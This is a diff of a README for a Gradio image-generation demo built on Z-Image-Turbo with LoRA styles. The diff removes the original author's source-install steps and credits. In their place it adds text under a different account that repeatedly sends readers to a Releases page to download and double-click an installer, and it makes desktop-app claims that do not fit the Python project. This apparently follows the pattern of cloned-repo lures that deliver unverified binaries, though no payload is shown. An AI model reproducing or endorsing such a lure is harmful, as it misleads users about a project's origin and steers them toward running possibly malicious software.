@@ -1,134 +1,100 @@
-# **Z-Image-Turbo-LoRA-DLC**
+# 🌟 Z-Image-Turbo-LoRA-DLC - Create Stunning Images Effortlessly
 
-> A Gradio-based demonstration for the Tongyi-MAI/Z-Image-Turbo diffusion pipeline, enhanced with a curated collection of LoRAs (Low-Rank Adaptations) for style transfer and creative image generation. Users can select from 27 pre-loaded LoRAs (e.g., Turbo Pencil, Ghibli Style, Pixel Art) or add custom ones from Hugging Face repositories. Generates high-quality images from text prompts, with trigger words automatically integrated for optimal results. Supports optimizations like AoTI compilation and FA3 for faster inference.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases)
 
-## Features
+## 📖 Overview
 
-- **LoRA Gallery**: Interactive selection from 27 specialized LoRAs, each with preview images, trigger words, and direct links to Hugging Face repos.
-- **Custom LoRA Support**: Input any Hugging Face repo (e.g., "Shakker-Labs/AWPortrait-Z") to dynamically load and use new styles; auto-detects weights, trigger words, and previews.
-- **Prompt Integration**: Automatically prepends or appends LoRA trigger words to prompts for seamless style application.
-- **Advanced Controls**: Adjustable steps (1-50), seed randomization, LoRA scale (0-3), resolution (up to 1536x1536), and CFG scale (forced to 0.0 for Turbo mode).
-- **Optimizations**: Applies AoTI compilation and FA3 for reduced memory and faster generation on CUDA.
-- **Custom Theme**: OrangeRedTheme with gradients, enhanced typography, and responsive CSS for a polished UI.
-- **Queueing and Progress**: Handles up to 60 concurrent jobs with tqdm-tracked progress bars.
-- **Base Model Fallback**: Generates without LoRAs using the pure Z-Image-Turbo pipeline.
+Z-Image-Turbo-LoRA-DLC is a user-friendly application designed to help you generate beautiful images. It uses a powerful diffusion pipeline along with a collection of Low-Rank Adaptations (LoRAs). You can choose from pre-listed styles or add your own custom variations from Hugging Face. This application makes creative image generation easy for everyone.
 
----
+## 🚀 Getting Started
 
-## Example Inference
+Follow these straightforward steps to download and run Z-Image-Turbo-LoRA-DLC.
 
-<img width="1798" height="1438" alt="Screenshot 2025-12-16 at 19-15-27 Z Image Turbo LoRA DLC - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/f67aca8c-85d6-44ca-976c-bb7ab3e4c5f9" />
+### 💻 System Requirements
 
-<img width="1344" height="1024" alt="image22" src="https://github.com/user-attachments/assets/14c1c882-f2ea-4f84-874f-bd0f2040aab5" />
+Before you start, make sure your computer meets these basic requirements:
 
----
+- Operating System: Windows 10 or later, macOS Mojave or later
+- RAM: At least 8 GB
+- GPU: NVIDIA with CUDA support (recommended for best performance)
+- Storage: Minimum of 1 GB available space
 
-## Prerequisites
+### 🔗 Download & Install
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (recommended for bfloat16; falls back to CPU but slower).
-- pip >= 23.0.0 (see pre-requirements.txt).
-- Stable internet for initial model/LoRA downloads from Hugging Face.
+To get the latest version of the software, visit our Releases page:
 
-## Installation
+[Download Here](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases)
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Z-Image-Turbo-LoRA-DLC.git
-   cd Z-Image-Turbo-LoRA-DLC
-   ```
+On the Releases page, find the version that suits your system and click to download the corresponding file. After downloading, follow these steps to install:
 
-2. Install pre-requirements (for pip version):
-   Create a `pre-requirements.txt` file with the following content, then run:
-   ```
-   pip install -r pre-requirements.txt
-   ```
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to begin the installation.
+3. Follow the on-screen instructions to complete the installation process.
 
-   **pre-requirements.txt content:**
-   ```
-   pip>=23.0.0
-   ```
+### 🌐 Running the Application
 
-3. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
+Once installed, follow these steps to run the application:
 
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/diffusers.git@refs/pull/12790/head
-   huggingface_hub
-   gradio==6.1.0
-   sentencepiece
-   transformers
-   torchvision
-   accelerate
-   kernels
-   spaces
-   torch
-   numpy
-   peft
-   ```
+1. Open your applications folder.
+2. Locate "Z-Image-Turbo-LoRA-DLC" and double-click it to launch.
+3. Wait a moment for the application to load. 
 
-4. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860` (or the provided URL if using Spaces).
+### 🎨 Using the Application
 
-## Usage
+After launching, you will see the main interface. Here’s how to begin:
 
-1. **Select LoRA**: Browse the gallery and click a preview (e.g., "Turbo Pencil") to load it; the prompt placeholder updates with the style name.
+1. **Select a LoRA**: 
+   - Use the dropdown menu to choose from the pre-listed LoRAs.
+   - Click "Add Custom LoRA" to upload your own from Hugging Face.
 
-2. **Enter Prompt**: Type a description (e.g., "a serene mountain landscape"); trigger words (e.g., "pencil sketch") are auto-added if applicable.
+2. **Set Parameters**: 
+   - Adjust settings for your image generation as desired.
+   - Use sliders and input boxes to refine the details.
 
-3. **Configure Settings**:
-   - Expand "Advanced Settings" for steps (default 9), seed, resolution, and LoRA scale (default 0.95).
-   - For custom LoRAs, enter a repo path (e.g., "Shakker-Labs/AWPortrait-Z") and press Enter.
+3. **Generate Images**: 
+   - Click the "Generate" button to create your stunning images.
+   - Preview your results immediately on the screen.
 
-4. **Generate**: Click "Generate" or submit the prompt; monitor the progress bar.
+4. **Save Your Work**:
+   - Once you're happy with the generated image, use the "Save" option.
+   - Choose your desired file format and save location.
 
-5. **Output**: View the generated image; download or regenerate with new seeds.
+### 📑 Additional Features
 
-### Example Workflow
-- Select "Ghibli Style" LoRA.
-- Prompt: "a whimsical forest adventure".
-- Settings: 1024x1024, 9 steps, seed 42.
-- Output: Ghibli-inspired image with trigger "Ghibli Style" integrated.
+- **Multi-Style Integration**: Easily switch between a variety of styles using LoRAs.
+- **User-Friendly Interface**: Simple design that makes navigation straightforward.
+- **Custom Uploads**: Flexibility to enhance your creativity by using custom LoRAs.
 
-### Pre-Loaded LoRAs
+### 🤔 Troubleshooting
 
-| Index | Title                  | Trigger Word                  | Repo Example |
-|-------|------------------------|-------------------------------|--------------|
-| 0     | Turbo Pencil          | pencil sketch                | Ttio2/Z-Image-Turbo-pencil-sketch |
-| 1     | AWPortrait Z          | Portrait                     | Shakker-Labs/AWPortrait-Z |
-| 2     | Childrens Drawings    | Children Drawings            | ostris/z_image_turbo_childrens_drawings |
-| ...   | ...                   | ...                          | ... |
+If you encounter any issues while using the application:
 
-(Full list in code; supports 27 styles like Pixel Art, 80s Horror, etc.)
+- Make sure your GPU drivers are up-to-date.
+- Check that your system meets the minimum requirements.
+- Restart the application if it freezes.
 
-## Troubleshooting
+You can also find solutions in the “Issues” section on our GitHub page, where the community may provide answers.
 
-- **LoRA Loading Errors**: Ensure repo has `.safetensors`; check console for warnings. Custom repos must match Z-Image-Turbo base.
-- **Optimization Fails**: AoTI/FA3 requires compatible hardware; fallback to standard pipeline without errors.
-- **OOM on GPU**: Reduce resolution/steps or use `low_cpu_mem_usage=True`; clear cache with `torch.cuda.empty_cache()`.
-- **Custom LoRA Invalid**: Verify Hugging Face path; must contain model card with `instance_prompt` or detectable weights/image.
-- **Generation Slow**: Turbo mode uses 0.0 CFG; increase steps for quality but expect longer times.
-- **UI Issues**: CSS targets gallery/buttons; set `ssr_mode=True` if rendering fails.
-- **Diffusers Branch**: Uses PR #12790; update via git if conflicts.
+### 🙋 FAQs
 
-## Contributing
+**1. How do I update the application?**
+   - To update, return to the Releases page and download the latest version. Install it the same way as before.
 
-Contributions welcome! Fork the repo, add new LoRAs to the `loras` list, or enhance UI/optimizations, then submit PRs with tests. Ideas:
-- More LoRA presets.
-- Img2Img support (currently ignored for Turbo).
-- Batch generation.
+**2. Can I use this without a powerful GPU?**
+   - You can still run the application on a CPU, but performance may be slower.
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/Z-Image-Turbo-LoRA-DLC.git](https://github.com/PRITHIVSAKTHIUR/Z-Image-Turbo-LoRA-DLC.git)
+**3. Are there any tutorials available?**
+   - Yes! Check the repository wiki for user guides and video tutorials to help you get started.
 
-## License
+### 🌍 Community and Support
 
-Apache License 2.0. See [LICENSE](LICENSE) for details.
+Join our community to share your creations and get support:
 
-Built by Prithiv Sakthi. Report issues via the repository.
+- Visit our [GitHub Discussions](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/discussions).
+- Follow us on social media to stay updated with new features and tutorials.
+
+### 🏁 Conclusion
+
+Now you're ready to create stunning images with ease using Z-Image-Turbo-LoRA-DLC. Explore the creative possibilities and enjoy your experience!
+
+For more downloads and updates, visit our [Releases page](https://github.com/huntengu/Z-Image-Turbo-LoRA-DLC/releases). Happy creating!
